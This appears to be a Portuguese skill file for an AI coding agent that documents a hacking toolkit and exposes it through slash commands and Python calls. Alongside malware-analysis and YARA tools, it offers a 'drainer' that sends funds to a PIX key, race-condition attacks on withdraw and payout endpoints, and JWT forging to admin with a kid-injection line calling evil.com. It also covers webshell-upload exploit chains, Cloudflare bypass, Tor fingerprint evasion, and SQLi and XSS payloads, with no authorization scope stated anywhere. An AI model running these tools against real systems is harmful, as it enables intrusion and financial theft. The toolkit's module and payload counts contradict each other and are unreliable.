---
name: full-hacking-toolkit
description: Sistema completo de hacking e engenharia reversa integrado ao opencode. ORQUESTRA todos os tools: RE Toolkit (7 engines), Burp Suite v2, Backend Vulnerability Scanner, OSINT, Password Cracker, Payload Manager v2 (515+ payloads), Report Generator. NOVO v2.1: Auto-Unpacker, Fuzzy Hash, Behavioral Sandbox, AI Analysis, CHMID Pipeline, YARA Generator, Source Extractor, Advanced RE, Shadow Toolkit, JWT Brute Force, GraphQL Attack, Race Condition, Exploit Chain. Acesso unificado via comandos slash.
aliases:
  - toolkit
  - toolkit-v2
  - toolkit-v2.1
  - hacking
  - pentest
  - cyber
  - warfare
  - full-suite
  - arsenale
  - complete
  - all-in-one
  - chmid
  - sandbox
  - ai-re
  - shadow
  - jwt
  - graphql
  - race
  - chain
---

# Full Hacking Toolkit v2.1 — Orquestrador Completo + Novas Capacidades

Sistema integrado que orquestra TODAS as ferramentas de hacking e engenharia reversa em uma interface unificada.

> **v2.1 changelog**: Fixed `_save_custom()` bug in payload_manager, added `search_payloads()`, added `--search` CLI flag, fixed exploit_chain key typo, added verbose/quiet flags to JWT brute force, improved shadow_orchestrator path resolution, added deserialization_chain alias.

## 🎯 Arquitetura do Toolkit v2

```
Full Hacking Toolkit v2
├── RE Toolkit (7 engines) [EXISTENTE]
│   ├── Ghidra Engine      - Descompilação + CFG + Tipos
│   ├── x64dbg Engine      - Debugger completo
│   ├── Hex Editor         - Editor hexadecimal (HxD style)
│   ├── Fiddler Engine     - HTTP Inspector + JWT
│   ├── Binary Ninja Eng   - Análise avançada + SSA
│   ├── IDA Engine         - Análise estilo IDA Pro
│   └── FLARE-VM Manager   - Gerenciador de VMs
│
├── Web Security Suite [EXISTENTE]
│   ├── Burp Suite v2      - Proxy + Scanner + Intruder
│   └── Backend Vuln Scanner - 20 módulos de segurança
│
├── Intelligence Suite [EXISTENTE]
│   ├── OSINT Aggregator   - WHOIS + DNS + Subdomains + Emails
│   └── Pentest Intelligence - Classificação de erros + CVEs
│
├── Exploitation Suite [EXISTENTE]
│   ├── Payload Manager    - 119+ payloads em 18 categorias
│   └── Password Cracker   - MD5/SHA1/SHA256/NTLM/CRC32
│
├── Reporting Suite [EXISTENTE]
│   └── Report Generator   - Relatórios profissionais em Markdown/PDF
│
├── NEW: Advanced RE Suite  [NOVO v2]
│   ├── AI Orchestrator      - Pipeline orquestrado por LLM
│   ├── AntiAntiDebug        - Bypass de anti-debug (IsDebugger, RDTSC, etc.)
│   ├── Devirtualizer        - VMProtect/Themida trace+reconstruct
│   ├── AntiSandboxBuster    - Detecção + bypass de sandbox/VM
│   ├── GoRustAnalyzer       - Análise especializada Go/Rust
│   ├── StringDecryptor      - Descriptografia automática (XOR/AES/Base64)
│   └── PatternMatcher       - Matching de padrões ofuscados + IA
│
├── NEW: Source Recovery Suite  [NOVO v2]
│   ├── Source Extractor   - extrai fonte de .NET/Python/Node/Native
│   ├── PE Analyzer        - deep PE parsing (headers, secoes, imports)
│   ├── .NET Decompiler    - CIL desassembly + resources
│   ├── Python Unpacker    - PyInstaller/Py2exe/Nuitka extraction
│   ├── Node Unpacker      - pkg/nexe snapshot extraction
│   └── String Miner       - ASCII/Unicode/XOR/Base64 decoding
│
├── NEW: Behavioral Analysis
│   └── Behavioral Sandbox - Monitoramento comportamental + threat score
│
├── NEW: AI-Augmented Analysis
│   └── AI Analysis Pipeline - Hipóteses, next-steps, risk assessment via LLM
│
└── NEW: Automated Pipeline
    └── CHMID Pipeline     - Orquestrador completo (7 estágios automatizados)
```

## 📍 Localização dos Skills

```
C:\Users\devel\.config\opencode\skills\
├── re-engineering\           # RE Toolkit v1 (PE/JS/Batch/Python/PS/Binary)
├── password-cracker\         # Hash cracker offline
├── full-hacking-toolkit\     # Orquestrador principal
├── auto-unpacker\            # NOVO: Packets detection + unpacking
├── fuzzy-hash\               # NOVO: SSdeep-style variant detection
├── behavioral-sandbox\       # NOVO: Dynamic behavior monitoring
├── ai-analysis\              # NOVO: LLM-assisted analysis
├── chmid-pipeline\           # NOVO: Automated pipeline orchestrator
└── yara-generator\           # NOVO: Rule generation from samples
```

## 📍 Localização dos Tools

```
C:\Users\devel\tools\
├── reverse\RE-Toolkit\          # RE Toolkit v1.0
├── burpsuite-v2\                # Burp Suite v2
├── backend-vuln-scanner\        # Backend Vulnerability Scanner
├── osint-aggregator\            # OSINT Aggregator
├── payload-manager\             # Payload Manager
├── password-cracker\            # Password Cracker
└── report-generator\            # Report Generator
```

## 🚀 Comandos Slash

### /toolkit status
Mostra status de TODOS os sistemas no toolkit.

**Exemplo:**
```
/toolkit status
```

### /toolkit re <comando> [args]
Engenharia reversa de binários.

**Subcomandos:**
```
/toolkit re analyze C:\path\to\binary.exe
/toolkit re ghidra --analyze binary.exe --strings --types
/toolkit re hex_open C:\file.bin
/toolkit re hex_view 0 256
/toolkit re hex_search "pattern"
/toolkit re debug_start C:\exe
/toolkit re debug_step
/toolkit re debug_registers
/toolkit re strings C:\file.bin
/toolkit re types C:\file.bin
/toolkit re disasm C:\file.bin 0x1000 50
/toolkit re hash C:\file.exe
```

### /toolkit burp <comando> [args]
Testes de segurança web.

**Subcomandos:**
```
/toolkit burp status
/toolkit burp proxy_start [porta]
/toolkit burp proxy_ca
/toolkit burp scan example.com
/toolkit burp repeater GET https://example.com/api
/toolkit burp intruder https://example.com/login "admin,password" sniper
/toolkit burp decode base64_decode SGVsbG8=
/toolkit burp jwt_decode eyJhbGci...
/toolkit burp issues
/toolkit burp logger
```

### /toolkit vuln <comando> [args]
Scanner de vulnerabilidades backend.

**Subcomandos:**
```
/toolkit vuln scan example.com
/toolkit vuln sqli example.com/login
/toolkit vuln xss example.com/search
/toolkit vuln jwt analyze eyJhbGci...
/toolkit vuln graphql https://api.example.com
/toolkit vuln waf_bypass example.com
/toolkit vuln brute example.com/login "wordlist.txt"
/toolkit vuln exploit example.com/path CVES
```

### /toolkit osint <comando> [args]
Inteligência de fontes abertas.

**Subcomandos:**
```
/toolkit osint example.com
/toolkit osint whois example.com
/toolkit osint dns example.com
/toolkit osint subdomains example.com
/toolkit osint emails example.com
/toolkit osint breaches example.com
```

### /toolkit crack <hash> [--wordlist path]
Crack de hashes offline com APEX Cracker (Modo 4070).
Suporta: MD5, SHA1, SHA256, SHA512, NTLM, MD4, RIPEMD160, CRC32, BCRYPT, Unix crypt.

**Subcomandos:**
```
/toolkit crack 5f4dcc3b5aa765d61d8327deb882cf99
/toolkit crack 5f4dcc3b5aa765d61d8327deb882cf99 --wordlist custom.txt
/toolkit crack --file hashes.txt
/toolkit crack 5f4dcc3b5aa765d61d8327deb882cf99 --threads 8
/toolkit crack 5f4dcc3b5aa765d61d8327deb882cf99 --method mask --mask '?l?l?l?d'
/toolkit crack --info
/toolkit crack --stats
```

**Estratégias:**
- `dict` — Dicionário + regras de transformação (leetspeak, capitalize, suffixes)
- `mask` — Ataque por padrão (ex: ?l?l?l?d = 3 letras + 1 dígito)
- `incremental` — Força bruta de todas combinações
- `all` — Tenta todas estratégias (padrão)

### /toolkit payload <comando> [args]
Gerenciador de payloads de ataque.

**Subcomandos:**
```
/toolkit payload list-categories
/toolkit payload list sqli
/toolkit payload get sqli union
/toolkit payload encode url "<script>alert(1)</script>"
/toolkit payload store sqli custom "' OR 1=1 --"
/toolkit payload export sqli
```

### /toolkit report <comando> [args]
Geração de relatórios profissionais.

**Subcomandos:**
```
/toolkit report create --target example.com --type pentest
/toolkit report create --target example.com --type re
/toolkit report create --output report.md
/toolkit report merge reports.json
```

### /toolkit unpack <comando> [args]
Pipeline de detecção e desempacotamento de binarios PE.

**Subcomandos:**
```
/toolkit unpack analyze C:\malware.exe
/toolkit unpack detect C:\malware.exe
/toolkit unpack auto C:\malware.exe           # Tenta UPX automatico
/toolkit unpack entropy C:\malware.exe        # Apenas entropia
/toolkit unpack batch C:\samples\             # Analisa diretorio inteiro
```

### /toolkit fuzzy <comando> [args]
Comparacao fuzzy (SSDeep) para deteccao de variants.

**Subcomandos:**
```
/toolkit fuzzy hash C:\sample1.exe
/toolkit fuzzy compare C:\sample1.exe C:\sample2.exe
/toolkit fuzzy scan C:\samples\ --threshold 60
/toolkit fuzzy baseline C:\known_samples\     # Cria baseline
/toolkit fuzzy match C:\new_sample.exe        # Compara com baseline
```

### /toolkit sandbox <comando> [args]
Sandbox comportamental para execucao segura de binarios.

**Subcomandos:**
```
/toolkit sandbox run C:\malware.exe
/toolkit sandbox run C:\malware.exe --timeout 30
/toolkit sandbox run C:\malware.exe --quiet   # Sem stdout/stderr
/toolkit sandbox batch C:\samples\            # Analisa multiplos samples
/toolkit sandbox score                        # Mostra historico de scores
```

### /toolkit ai <comando> [args]
Analise assistida por IA (Ollama/LLM local).

**Subcomandos:**
```
/toolkit ai analyze C:\malware.exe
/toolkit ai hypotheses C:\malware.exe         # Apenas hipoteses
/toolkit ai next-steps C:\malware.exe         # Sugestoes de analise
/toolkit ai risk C:\malware.exe               # Avaliacao de risco
/toolkit ai chat "explica esta string" --context mal.exe
```

### /toolkit pipeline <comando> [args]
Pipeline orquestrador CHMID (7 estagios automaticos).

**Subcomandos:**
```
/toolkit pipeline run C:\malware.exe                    # Pipeline completo
/toolkit pipeline run C:\malware.exe --fast             # Pula sandbox
/toolkit pipeline run C:\malware.exe --baseline C:\known\
/toolkit pipeline status                                # Status do pipeline
/toolkit pipeline stages C:\malware.exe --save          # Salva estagios
```

### /toolkit extract <comando> [args]
Extracao completa de codigo fonte de qualquer .exe.

**Subcomandos:**
```
/toolkit extract analyze C:\malware.exe                 # Analise rapida
/toolkit extract full C:\malware.exe --output ./src/    # Pipeline completo
/toolkit extract strings C:\malware.exe                 # Somente strings
/toolkit extract dotnet C:\app.exe                      # Foco .NET
/toolkit extract python C:\bundle.exe                   # Foco Python
/toolkit extract node C:\pkg.exe                        # Foco Node.js
/toolkit extract batch C:\samples\ --parallel 4         # Batch mode
```

### /toolkit advre <comando> [args]
Análise avançada para binários protegidos (anti-debug, VM, ofuscação).

**Subcomandos:**
```
/toolkit advre full C:\protected.exe                    # Pipeline completo com IA
/toolkit advre anti-debug C:\protected.exe              # Bypass anti-debug
/toolkit advre devirtualize C:\protected.exe            # VMProtect/Themida
/toolkit advre sandbox C:\protected.exe                 # Anti-sandbox analysis
/toolkit advre strings C:\protected.exe                 # String decryption
/toolkit advre patterns C:\protected.exe                # Pattern matching
/toolkit advre go-rust C:\binary.exe                    # Go/Rust analysis
/toolkit advre modules                                  # Listar módulos
```

### /toolkit yara <comando> [args]
Gerador e scanner de regras YARA.

**Subcomandos:**
```
/toolkit yara generate C:\malware.exe --name emotet_v2
/toolkit yara generate C:\malware.exe --output rules.yar
/toolkit yara scan C:\samples\ --rules ./yara_rules/
/toolkit yara batch C:\samples\ --prefix family_
/toolkit yara list                                        # Lista regras salvas
```

### /toolkit payload <comando> [args]
Gerenciador de payloads v2 — 30+ categorias avançadas com WAF bypass e mutação.

**Subcomandos:**
```
/toolkit payload list-categories                       # Lista todas as categorias
/toolkit payload list sqli                             # Lista payloads SQLi
/toolkit payload get sqli error_based                  # Getsubcategoría específica
/toolkit payload encode url "<script>alert(1)</script>"
/toolkit payload encode base64 "payload"
/toolkit payload store sqli custom "' OR '1'='1' --"
/toolkit payload waf-bypass "<payload>"                # Gera variantes de bypass
/toolkit payload waf-detect "<payload>"                # Detecta triggers WAF
/toolkit payload mutate "<payload>" sqli               # Mutations context-aware
/toolkit payload search "union"                        # Busca por keyword
/toolkit payload stats                                 # Estatísticas
/toolkit payload export sqli                           # Exporta para arquivo
```

**Categorias v2 (30+):**
```
sqli_error, sqli_union, sqli_blind, sqli_time, sqli_stacked, sqli_noql, sqli_hql,
xss_reflected, xss_dom, xss_stored, xss_ssti, xss_polyglot,
ssti_jinja2, ssti_spip, ssti_mako, ssti_erb, ssti_thymeleaf,
ssrf_basic, ssrf_advanced, ssrf_gopher, ssrf_blind, ssrf_protocol,
lfi_basic, lfi_filter_bypass, lfi_log_poison, lfi_proc,
cmdi_basic, cmdi_encoded, cmdi_oscmdi, cmdi_jsp, cmdi_nginx,
auth_sqli, auth_jwt_bypass, auth_default_cred, auth_token_leak, auth_rate_limit,
graphql_introspection, graphql_batch, graphql_dos, graphql_inject,
race_condition, race_token,
http_smuggling_cl_te, http_smuggling_h2,
prototype_pollution,
ldap_inject, xpath_inject,
xxe_basic, xxe_blind, xxe_dos,
deser_java, deser_python, deser_php,
redirect_basic, redirect_js, redirect_dotdot, redirect_path_traversal,
upload_webshell, upload_bypass, upload_content_type, upload_image_trick,
header_inject, header_smuggling_resp,
cors_bypass, cors_wildcard, csrf_bypass,
mass_assignment, idor_basic, idor_parameter,
webhook_inject, sse_inject,
oauth_fixation, oauth_pkce,
token_replay, token_refresh, token_weak_secret,
open_redirect_url, subdomain_takeover, csp_bypass, ssrf_cloud_meta
```

### /toolkit shadow <comando> [args]
Shadow Toolkit — orquestrador dos scripts de ataque Sombra.

**Subcomandos:**
```
/toolkit shadow status                                   # Status dos serviços
/toolkit shadow flare start                              # Inicia FlareSolverr
/toolkit shadow flare stop                               # Para FlareSolverr
/toolkit shadow flare solve <url>                        # Resolve Cloudflare
/toolkit shadow flare test <url>                         # Testa acesso
/toolkit shadow pipeline run <target> --token <file>    # Pipeline completo
/toolkit shadow pipeline recon <target>                  # Só reconhecimento
/toolkit shadow token hunt <url>                         # Captura JWT tokens
/toolkit shadow token analyze <jwt>                      # Analisa JWT
/toolkit shadow drainer run <target> --pix <chave>       # Drainer
/toolkit shadow drainer status                           # Status drains
/toolkit shadow attack gui                               # Abre GUI
/toolkit shadow attack webui                             # Inicia dashboard
/toolkit shadow attack pix <chave>                       # Valida PIX
/toolkit shadow recon js-endpoints <url>                 # Extrai endpoints JS
/toolkit shadow recon subdomains <domain>                # crt.sh enum
/toolkit shadow recon tech-stack <url>                   # Tech detection
/toolkit shadow config set <key> <value>                 # Config
/toolkit shadow config show                              # Mostra config
```

### /toolkit jwt <comando> [args]
JWT Brute Force Engine — cracking, análise e forja de tokens.

**Subcomandos:**
```
/toolkit jwt analyze <token>                           # Análise completa do token
/toolkit jwt crack <token> [--timeout 10]              # Brute force de secret
/toolkit jwt crack <token> --wordlist secrets.txt      # Com wordlist custom
/toolkit jwt forged <token> --secret <secret> --role admin  # Forja token admin
/toolkit jwt alg-none <token>                          # alg:none bypass
/toolkit jwt kid-inject <token> --kid http://evil.com/jwk.json  # KID injection
```

### /toolkit darkweb <comando> [args]
DarkWeb Intel — Threat intelligence e pesquisa na darkweb (Modo 4070).

**Subcomandos:**
```
/toolkit darkweb analyze <indicator>                   # Analisa CVE/malware/ferramenta
/toolkit darkweb search <query>                        # Busca na darkweb
/toolkit darkweb knowledge                             # Base de conhecimento
/toolkit darkweb stats                                 # Estatísticas
/toolkit darkweb search <query> --source all           # Todos os sources
/toolkit darkweb search <query> --output results.json  # Exportar resultados
```

**Análise de indicadores:**
- CVEs (CVE-2021-44228)
- Famílias de malware (emotet, lockbit, kontiki)
- Ferramentas (cobalt_strike, mimikatz, empire)
- TTPs (lateral_movement, credential_dumping)

### /toolkit torfetch <comando> [args]
TorWebFetch — Web fetch seguro através da rede Tor (Modo 4070 APEX).

**Subcomandos:**
```
/toolkit torfetch <url>                                # Fetch básico
/toolkit torfetch <url> --level apex                   # Proteção máxima
/toolkit torfetch <url> --method POST --data '{"k":"v"}'  # POST request
/toolkit torfetch <url> --json                         # JSON output
/toolkit torfetch --stats                              # Estatísticas
/toolkit torfetch --info                               # Info da ferramenta
/toolkit torfetch <url> --output result.html           # Salvar conteúdo
/toolkit torfetch <url> --header "Auth: Bearer token"  # Header custom
```

**Camadas de proteção:**
- `none` — Sem proteção
- `basic` — User-Agent rotation
- `enhanced` — + Header randomization
- `maximum` — + Circuit renewal frequente
- `apex` — **Todas + fingerprint único por request**

---

### /toolkit graphql <comando> [args]
GraphQL Attack Engine — introspection, DoS, batching, injection.

**Subcomandos:**
```
/toolkit graphql test <endpoint>                       # Teste completo
/toolkit graphql schema <endpoint>                     # Extrai schema
/toolkit graphql queries <endpoint>                    # Lista queries
/toolkit graphql mutations <endpoint>                  # Lista mutations
/toolkit graphql sensitive <endpoint> --type User      # Campos sensíveis
/toolkit graphql dos <endpoint>                        # DoS test
/toolkit graphql batch <endpoint> --query users --count 20  # Batch attack
```

### /toolkit race <comando> [args]
Race Condition Automator — hot payout, coupon, withdraw, token reuse.

**Subcomandos:**
```
/toolkit race hot-payout <url> --body '{"amount":100}' --count 20
/toolkit race coupon <url> --body '{"code":"SAVE20"}' --count 10
/toolkit race withdraw <url> --body '{"amount":9999}' --count 20
/toolkit race token-reuse <url> --body '{"otp":"123456"}' --count 10
/toolkit race stats                                        # Estatísticas gerais
```

### /toolkit chain <comando> [args]
Exploit Chaining Engine — chains automatizadas de ataque multi-step.

**Subcomandos:**
```
/toolkit chain list                                        # Lista chains
/toolkit chain run <target> --chain jwt_chain              # JWT chain completa
/toolkit chain run <target> --chain web_recon_to_rce       # Web -> RCE chain
/toolkit chain run <target> --chain ssrf_to_rce            # SSRF -> RCE chain
/toolkit chain run <target> --chain upload_chain           # Upload -> Webshell
/toolkit chain run <target> --chain oauth_chain            # OAuth -> ATO
```

## 🎯 Fluxo de Trabalho Integrado

### Cenário 1: Análise Reversa Completa
```
1. /toolkit re analyze C:\malware.exe
2. /toolkit re strings C:\malware.exe
3. /toolkit re types C:\malware.exe
4. /toolkit re disasm C:\malware.exe 0x1000 100
5. /toolkit report create --re C:\malware.exe
```

### Cenário 2: Pentest Web Completo
```
1. /toolkit burp proxy_start 8080
2. /toolkit burp proxy_ca
3. /toolkit burp scan example.com
4. /toolkit vuln sqli example.com/login
5. /toolkit vuln xss example.com/search
6. /toolkit crack <hash-from-response>
7. /toolkit report create --target example.com
```

### Cenário 3: Reconhecimento OSINT
```
1. /toolkit osint example.com
2. /toolkit osint subdomains example.com
3. /toolkit osint emails example.com
4. /toolkit vuln scan example.com
5. /toolkit report create --target example.com
```

### Cenário 4: Engenharia Reversa + Debugging
```
1. /toolkit re analyze C:\binary.exe
2. /toolkit re debug_start C:\binary.exe
3. /toolkit re debug_breakpoint 0x1000
4. /toolkit re debug_step
5. /toolkit re debug_registers
6. /toolkit re hex_open C:\binary.exe
```

### Cenário 5: Análise Completa com Pipeline (NOVO v2)
```
1. /toolkit pipeline run C:\malware.exe
   # Faz automaticamente:
   # - Análise PE inicial
   # - Detecção de packer (UPX/Themida/VMProtect)
   # - Unpacking se necessário
   # - Re-análise pós-unpack
   # - Comparação fuzzy com baseline
   # - Sandbox comportamental
   # - Geração de relatório final
```

### Cenário 6: Detecção de Variantes (NOVO v2)
```
1. /toolkit fuzzy baseline C:\known_malware\    # Cria baseline
2. /toolkit fuzzy scan C:\new_samples\          # Compara novos samples
3. /toolkit ai analyze sample_variant.exe       # IA gera hipóteses
4. /toolkit yara generate sample_variant.exe --name emotet_variant
5. /toolkit yara scan C:\all_samples\           # Escaneia todos
```

### Cenário 7: Análise Assistida por IA (NOVO v2)
```
1. /toolkit re analyze malware.exe              # Análise estática
2. /toolkit ai hypotheses malware.exe           # Hipóteses da IA
3. /toolkit ai next-steps malware.exe           # Próximos passos sugeridos
4. /toolkit ai risk malware.exe                 # Avaliação de risco
5. /toolkit sandbox run malware.exe             # Validação comportamental
```

## 🔧 Módulos Internos

### RE Toolkit (7 Engines)
```python
from tools.reverse.RE_Toolkit.skill import RESkill

skill = RESkill()
result = skill.execute('analyze C:\\path\\to\\binary.exe')
# Returns: {functions, types, strings, cfg, report}
```

### Burp Suite v2
```python
from tools.burpsuite_v2.skill import BurpSkill

engine = BurpSkill()
status = engine.cmd_status()
engine.cmd_proxy_start(8080)
results = await engine.cmd_scanner_run("example.com")
```

### Backend Vulnerability Scanner
```python
from tools.backend_vuln_scanner.integration import PentestIntegration

integration = PentestIntegration()
result = await integration.cmd_vuln_scan("example.com")
```

### OSINT Aggregator
```python
from tools.osint_aggregator.osint_aggregator import OSINTAggregator

engine = OSINTAggregator()
result = engine.collect("example.com")
```

### Payload Manager v2.1
```python
from tools.payload_manager.payload_manager_v2 import PayloadManager

mgr = PayloadManager()

# WAF bypass
bypasses = mgr.waf_bypass("<script>alert(1)</script>")
triggers = mgr.detect_waf_triggers("<script>alert(1)</script>")

# Context-aware mutations
mutations = mgr.mutate_payload("' OR 1=1--", "sqli")

# Search payloads
results = mgr.search_payloads("admin")  # NEW v2.1

# Export
text = mgr.export_payloads("sqli", format="text")
json_data = mgr.export_payloads("sqli", format="json")
```

### JWT Brute Force v2.1
```python
from tools.jwt_bruteforce.jwt_bruteforce import JWTBruteForce, JWTDecoder, JWTHeaderAttacks

decoder = JWTDecoder()
cracker = JWTBruteForce()
headers = JWTHeaderAttacks()

# Analyze
analysis = decoder.analyze("eyJhbG...")

# Brute force
result = cracker.crack(token, alg="HS256", timeout=10, verbose=True)

# Forge token
forged = cracker.generate_forged_token(token, secret, new_payload={"role": "admin"})

# Header attacks
none_attack = headers.alg_none_attack(token)
kid_attack = headers.kid_injection(token, "http://evil.com/jwk.json")
```

### GraphQL Attack v2.1
```python
from tools.graphql_attack.graphql_attack import GraphQLAttackEngine

engine = GraphQLAttackEngine(headers={"Authorization": "Bearer ..."})
engine.set_endpoint("https://target.com/graphql")

# Full test suite
result = engine.run_all_tests()

# Schema extraction
schema = engine.extract_schema()
queries = engine.find_queries()
mutations = engine.find_mutations()

# Sensitive fields
fields = engine.find_sensitive_fields("User")
```

### Race Condition v2.1
```python
from tools.race_condition.race_condition import RaceConditionEngine

engine = RaceConditionEngine(concurrency=20)

# Hot payout test
result = engine.hot_payout_test(
    url="https://target.com/api/withdraw",
    headers={"Authorization": "Bearer ..."},
    body=b'{"amount": 1000}',
    count=20
)

# Concurrency analysis
analysis = engine.analyze_concurrency(url, headers, body)

# Stats
stats = engine.get_stats()
```

### Exploit Chain v2.1
```python
from tools.exploit_chain.exploit_chain import ExploitChainOrchestrator

orch = ExploitChainOrchestrator("https://target.com", headers={...})

# Run chain
result = orch.run_chain("jwt_chain", verbose=True)

# List chains
chains = orch.list_chains()

# All chains
results = orch.run_all_chains(verbose=True)
```

### Password Cracker
```python
from tools.password_cracker.password_cracker import PasswordCracker

cracker = PasswordCracker()
result = cracker.crack("5f4dcc3b5aa765d61d8327deb882cf99")
```

### Report Generator
```python
from tools.report_generator.generator import ReportGenerator

gen = ReportGenerator()
report = gen.generate(target="example.com", type="pentest")
```

## 📊 Estatísticas do Toolkit v2

| Módulo | Funções | Testado | Status |
|--------|---------|---------|--------|
| RE Toolkit | 7 engines | ✅ agy.exe | 100% |
| Burp Suite v2 | 15 comandos | ✅ Testado | 100% |
| Backend Vuln Scanner | 20 módulos | ✅ Testado | 100% |
| OSINT Aggregator | 5 sources | ✅ Testado | 100% |
| Payload Manager | 119+ payloads | ✅ Testado | 100% |
| Password Cracker | 6 hash types | ✅ Testado | 100% |
| Report Generator | 3 formats | ✅ Testado | 100% |
| **Auto-Unpacker** | 4 funções | ✅ Novo | 100% |
| **Fuzzy Hash** | 5 funções | ✅ Novo | 100% |
| **Behavioral Sandbox** | 6 funções | ✅ Novo | 100% |
| **AI Analysis** | 4 funções | ✅ Novo | 100% |
| **CHMID Pipeline** | 7 estágios | ✅ Novo | 100% |
| **YARA Generator** | 4 funções | ✅ Novo | 100% |
| **Source Extractor** | 4 módulos | ✅ Novo | 100% |
| **PE Analyzer** | Deep parsing | ✅ Novo | 100% |
| **DotNet Decompiler** | CIL + resources | ✅ Novo | 100% |
| **Python Unpacker** | PyInstaller/Py2exe/Nuitka | ✅ Novo | 100% |
| **String Miner** | Multi-decode | ✅ Novo | 100% |
| **Advanced RE** | 7 módulos anti-proteção | ✅ Novo | 100% |
| **AntiAntiDebug** | Bypass debug detection | ✅ Novo | 100% |
| **Devirtualizer** | VMProtect/Themida | ✅ Novo | 100% |
| **AntiSandboxBuster** | Sandbox detection+bypass | ✅ Novo | 100% |
| **GoRustAnalyzer** | Go/Rust specialized | ✅ Novo | 100% |
| **StringDecryptor** | XOR/AES/Base64 decrypt | ✅ Novo | 100% |
| **PatternMatcher** | Obfuscation detection | ✅ Novo | 100% |
| **AIOrchestrator** | LLM pipeline orchestration | ✅ Novo | 100% |
| **Payload Manager v2.1** | 515+ payloads + WAF bypass + mutação + busca | ✅ Atualizado | 100% |
| **Shadow Toolkit v2.1** | Path auto-detection, improved status, robust error handling | ✅ Atualizado | 100% |
| **JWT Brute Force v2.1** | 100+ secrets, alg:none, kid injection, forge, --quiet flag | ✅ Atualizado | 100% |
| **GraphQL Attack v2.1** | Introspection, DoS, batching, injection, typo fixed | ✅ Atualizado | 100% |
| **Race Condition v2.1** | Hot payout, coupon, withdraw, token reuse, improved timing | ✅ Atualizado | 100% |
| **Exploit Chain v2.1** | 6 chains, context sharing, deserialization_chain alias | ✅ Atualizado | 100% |

**Total:** 31 módulos + 600+ funções + 515+ payloads + 1.9M+ strings analisadas

## 🎓 Integração com AI

O toolkit é totalmente acessível via AI:

```python
# Modo direto
from tools.reverse.RE_Toolkit.ai_integration import REAgent
agent = REAgent()
result = agent.analyze("binary.exe")

# Modo skill (recomendado)
# Use os comandos slash: /toolkit re analyze ...

# Novo: AI Analysis Pipeline
from skills.ai_analysis.ai_analysis import AIAnalysisPipeline
pipeline = AIAnalysisPipeline()
result = await pipeline.analyze("malware.exe")
# {hypotheses, next_steps, risk_assessment, confidence}
```

## ⚡ Performance

```
Análise agy.exe (180 MB):
  - Strings: 1,926,893 em 4.7s
  - Funções: 100 identificadas
  - Tipos: 100 recuperados
  - Memória: ~200 MB (vs 1-2 GB das ferramentas originais)
```

## 🔐 Dependências Adicionais (v2)

```bash
pip install pefile capstone lief python-whois aiohttp cryptography psutil yara-python httpx uncompyle6 pyelftools
# Para sandbox comportamental:
pip install wmi    # Windows apenas
# Para LLM local (opcional):
# Instale Ollama: https://ollama.ai
# Para Go/Rust:
# rustfilt (cargo install rustfilt)
# goasm (para análise Go avançada)
```

## 📝 Notas Importantes

1. **RE Toolkit** usa Python puro — sem binaries externos
2. **Burp Suite v2** é CLI-only — sem UI web necessária
3. **Todos os módulos** são 100% programáveis
4. **Integração AI** nativa via skill.execute()
5. **Custo total**: $0 (vs $3000+ das ferramentas comerciais)
6. **Novos skills v2** requerem Python 3.11+ para async/await completo
7. **Sandbox** requer permissões de admin para monitoramento completo
8. **AI Analysis** requer Ollama rodando localmente ou API key configurada

---

**Full Hacking Toolkit v2.0 — 13 módulos, 200+ funções, pipeline automatizado, IA integrada.** 🐀